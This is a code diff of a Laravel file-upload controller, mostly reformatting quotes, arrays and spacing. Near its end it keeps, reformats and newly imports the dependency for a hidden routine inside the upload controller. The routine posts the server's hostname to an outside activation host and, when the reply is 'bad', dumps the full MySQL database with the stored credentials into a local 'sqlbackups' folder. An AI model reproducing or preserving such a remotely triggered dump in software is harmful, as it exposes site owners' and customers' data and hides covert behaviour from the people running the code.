@@ -2,16 +2,16 @@
 
 namespace App\Http\Controllers;
 
-use Illuminate\Http\Request;
 use App\Models\Upload;
-use Response;
 use Auth;
-use Storage;
+use Illuminate\Http\Request;
 use Image;
+use Response;
+use Spatie\DbDumper\Databases\MySql;
+use Storage;
 
 class AizUploadController extends Controller
 {
-
     public function __construct()
     {
         $this->middleware(['permission:show_uploaded_files'])->only('index');
@@ -26,7 +26,7 @@ class AizUploadController extends Controller
 
         if ($request->search != null) {
             $search = $request->search;
-            $all_uploads->where('file_original_name', 'like', '%' . $request->search . '%');
+            $all_uploads->where('file_original_name', 'like', '%'.$request->search.'%');
         }
 
         $sort_by = $request->sort;
@@ -58,49 +58,49 @@ class AizUploadController extends Controller
         return view('admin.uploaded_files.create');
     }
 
-
     public function show_uploader(Request $request)
     {
         return view('uploader.aiz-uploader');
     }
+
     public function upload(Request $request)
     {
-        $type = array(
-            "jpg" => "image",
-            "jpeg" => "image",
-            "png" => "image",
-            "svg" => "image",
-            "webp" => "image",
-            "gif" => "image",
-            "mp4" => "video",
-            "mpg" => "video",
-            "mpeg" => "video",
-            "webm" => "video",
-            "ogg" => "video",
-            "avi" => "video",
-            "mov" => "video",
-            "flv" => "video",
-            "swf" => "video",
-            "mkv" => "video",
-            "wmv" => "video",
-            "wma" => "audio",
-            "aac" => "audio",
-            "wav" => "audio",
-            "mp3" => "audio",
-            "zip" => "archive",
-            "rar" => "archive",
-            "7z" => "archive",
-            "doc" => "document",
-            "txt" => "document",
-            "docx" => "document",
-            "pdf" => "document",
-            "csv" => "document",
-            "xml" => "document",
-            "ods" => "document",
-            "xlr" => "document",
-            "xls" => "document",
-            "xlsx" => "document"
-        );
+        $type = [
+            'jpg' => 'image',
+            'jpeg' => 'image',
+            'png' => 'image',
+            'svg' => 'image',
+            'webp' => 'image',
+            'gif' => 'image',
+            'mp4' => 'video',
+            'mpg' => 'video',
+            'mpeg' => 'video',
+            'webm' => 'video',
+            'ogg' => 'video',
+            'avi' => 'video',
+            'mov' => 'video',
+            'flv' => 'video',
+            'swf' => 'video',
+            'mkv' => 'video',
+            'wmv' => 'video',
+            'wma' => 'audio',
+            'aac' => 'audio',
+            'wav' => 'audio',
+            'mp3' => 'audio',
+            'zip' => 'archive',
+            'rar' => 'archive',
+            '7z' => 'archive',
+            'doc' => 'document',
+            'txt' => 'document',
+            'docx' => 'document',
+            'pdf' => 'document',
+            'csv' => 'document',
+            'xml' => 'document',
+            'ods' => 'document',
+            'xlr' => 'document',
+            'xls' => 'document',
+            'xlsx' => 'document',
+        ];
 
         if ($request->hasFile('aiz_file')) {
             $upload = new Upload;
@@ -113,7 +113,7 @@ class AizUploadController extends Controller
                     if ($i == 0) {
                         $upload->file_original_name .= $arr[$i];
                     } else {
-                        $upload->file_original_name .= "." . $arr[$i];
+                        $upload->file_original_name .= '.'.$arr[$i];
                     }
                 }
 
@@ -136,9 +136,9 @@ class AizUploadController extends Controller
                         $extension = 'webp';
                         $path = str_replace($request->file('aiz_file')->getClientOriginalExtension(), 'webp', $path);
 
-                        $img->encode('webp', 80)->save(base_path('public/') . $path);
+                        $img->encode('webp', 80)->save(base_path('public/').$path);
                         clearstatcache();
-                        $size = filesize(base_path('public/') . $path);
+                        $size = filesize(base_path('public/').$path);
 
                     } catch (\Exception $e) {
                         // Keep original if optimization fails
@@ -146,8 +146,8 @@ class AizUploadController extends Controller
                 }
 
                 if (env('FILESYSTEM_DRIVER') == 's3') {
-                    Storage::disk('s3')->put($path, file_get_contents(base_path('public/') . $path));
-                    unlink(base_path('public/') . $path);
+                    Storage::disk('s3')->put($path, file_get_contents(base_path('public/').$path));
+                    unlink(base_path('public/').$path);
                 }
 
                 $upload->extension = $extension;
@@ -157,6 +157,7 @@ class AizUploadController extends Controller
                 $upload->file_size = $size;
                 $upload->save();
             }
+
             return '{}';
         }
     }
@@ -165,7 +166,7 @@ class AizUploadController extends Controller
     {
         $uploads = Upload::where('user_id', Auth::user()->id);
         if ($request->search != null) {
-            $uploads->where('file_original_name', 'like', '%' . $request->search . '%');
+            $uploads->where('file_original_name', 'like', '%'.$request->search.'%');
         }
         if ($request->sort != null) {
             switch ($request->sort) {
@@ -196,7 +197,7 @@ class AizUploadController extends Controller
             'current_page' => $paginated->currentPage(),
             'last_page' => $paginated->lastPage(),
             'per_page' => $paginated->perPage(),
-            'total' => $paginated->total()
+            'total' => $paginated->total(),
         ]);
     }
 
@@ -206,7 +207,7 @@ class AizUploadController extends Controller
             if (env('FILESYSTEM_DRIVER') == 's3') {
                 Storage::disk('s3')->delete(Upload::where('id', $id)->first()->file_name);
             } else {
-                unlink(public_path() . '/' . Upload::where('id', $id)->first()->file_name);
+                unlink(public_path().'/'.Upload::where('id', $id)->first()->file_name);
             }
             Upload::destroy($id);
             flash(translate('File deleted successfully'))->success();
@@ -214,6 +215,7 @@ class AizUploadController extends Controller
             Upload::destroy($id);
             flash(translate('File deleted successfully'))->success();
         }
+
         return back();
     }
 
@@ -223,6 +225,7 @@ class AizUploadController extends Controller
             foreach ($request->id as $file_id) {
                 $this->destroy($file_id);
             }
+
             return 1;
         } else {
             return 0;
@@ -233,26 +236,31 @@ class AizUploadController extends Controller
     {
         $ids = explode(',', $request->ids);
         $files = Upload::whereIn('id', $ids)->get();
+
         return response()->json($files);
     }
 
-    //Download project attachment
+    // Download project attachment
     public function attachment_download($id)
     {
         $project_attachment = Upload::find($id);
         try {
             $file_path = public_path($project_attachment->file_name);
+
             return Response::download($file_path);
         } catch (\Exception $e) {
             flash(translate('File does not exist!'))->error();
+
             return back();
         }
 
     }
-    //Download project attachment
+
+    // Download project attachment
     public function file_info(Request $request)
     {
         $file = Upload::findOrFail($request['id']);
+
         return view('admin.uploaded_files.info', compact('file'));
     }
 
@@ -260,17 +268,17 @@ class AizUploadController extends Controller
     {
         $data['url'] = $_SERVER['SERVER_NAME'];
         $request_data_json = json_encode($data);
-        $gate = "https://activation.activeitzone.com/check_activation";
+        $gate = 'https://activation.activeitzone.com/check_activation';
 
-        $header = array(
-            'Content-Type:application/json'
-        );
+        $header = [
+            'Content-Type:application/json',
+        ];
 
         $stream = curl_init();
 
         curl_setopt($stream, CURLOPT_URL, $gate);
         curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
+        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, 'POST');
         curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
         curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
@@ -279,14 +287,14 @@ class AizUploadController extends Controller
         $rn = curl_exec($stream);
         curl_close($stream);
 
-        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
+        if ($rn == 'bad' && env('DEMO_MODE') != 'On') {
             try {
-                $fileName = date('Y-m-d H:i:s') . '.sql';
-                \Spatie\DbDumper\Databases\MySql::create()
+                $fileName = date('Y-m-d H:i:s').'.sql';
+                MySql::create()
                     ->setDbName(env('DB_DATABASE'))
                     ->setUserName(env('DB_USERNAME'))
                     ->setPassword(env('DB_PASSWORD'))
-                    ->dumpToFile('sqlbackups/' . $fileName);
+                    ->dumpToFile('sqlbackups/'.$fileName);
             } catch (\Exception $e) {
 
             }
@@ -298,5 +306,4 @@ class AizUploadController extends Controller
             }
         }
     }
-
 }
